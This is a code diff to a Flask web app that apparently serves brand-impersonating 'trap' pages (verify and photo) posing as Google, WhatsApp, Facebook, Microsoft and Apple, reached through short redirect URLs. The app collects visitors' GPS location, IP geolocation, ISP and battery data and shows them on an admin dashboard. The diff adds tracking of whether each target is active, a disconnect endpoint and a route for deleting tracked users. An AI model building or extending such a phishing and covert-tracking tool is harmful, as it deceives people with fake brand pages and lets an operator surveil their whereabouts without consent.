@@ -7,7 +7,7 @@ from flask import (
     redirect,
     url_for,
     Response,
-    abort,               # <-- Added for 404 handling
+    abort,
 )
 from flask_cors import CORS
 import os
@@ -72,14 +72,12 @@ VALID_BRANDS = ["google", "whatsapp", "facebook", "microsoft", "apple"]
 
 @app.route("/s/<brand>")
 def short_verify(brand):
-    """Short URL for verification: /s/google → /google/verify"""
     if brand not in VALID_BRANDS:
         abort(404)
     return redirect(url_for("verify_trap_clean", brand=brand))
 
 @app.route("/sp/<brand>")
 def short_photo(brand):
-    """Short URL for photo trap: /sp/google → /google/photo"""
     if brand not in VALID_BRANDS:
         abort(404)
     return redirect(url_for("photo_trap_clean", brand=brand))
@@ -142,7 +140,7 @@ def dashboard():
     return render_template("dashboard.html")
 
 # =============================================
-# API ENDPOINTS (unchanged)
+# API ENDPOINTS
 # =============================================
 
 @app.route("/send-location", methods=["POST"])
@@ -178,12 +176,14 @@ def receive_location():
         "ip_isp": ip_info.get("isp") if ip_info else None,
         "ip_lat": ip_info.get("lat") if ip_info else None,
         "ip_lon": ip_info.get("lon") if ip_info else None,
+        "active": True,
     }
 
     if session_id not in users:
         users[session_id] = {"current": location_data, "history": []}
     else:
         users[session_id]["current"] = location_data
+        users[session_id]["current"]["active"] = True
 
     users[session_id]["history"].append(location_data)
     if len(users[session_id]["history"]) > 50:
@@ -199,6 +199,26 @@ def receive_location():
     print(f"👥 Total users: {len(users)}")
 
     return jsonify({"status": "ok", "session_id": session_id})
+
+@app.route("/disconnect", methods=["POST"])
+def disconnect():
+    data = request.get_json()
+    session_id = data.get("session_id")
+    if session_id and session_id in users:
+        users[session_id]["current"]["active"] = False
+        print(f"🚪 User {session_id} disconnected")
+    return jsonify({"status": "ok"})
+
+# =============================================
+# 🔥 FIXED DELETE ROUTE – Works 100%
+# =============================================
+@app.route("/delete-user/<session_id>", methods=["DELETE"])
+def delete_user(session_id):
+    if session_id in users:
+        del users[session_id]
+        print(f"🗑️ User {session_id} deleted by admin")
+        return jsonify({"status": "deleted"})
+    return jsonify({"status": "not found"}), 404
 
 @app.route("/send-battery", methods=["POST"])
 def receive_battery():
@@ -238,6 +258,7 @@ def get_users():
                 "ip_city": data["current"].get("ip_city"),
                 "ip_country": data["current"].get("ip_country"),
                 "ip_isp": data["current"].get("ip_isp"),
+                "active": data["current"].get("active", False),
             }
         )
     return jsonify(user_list)
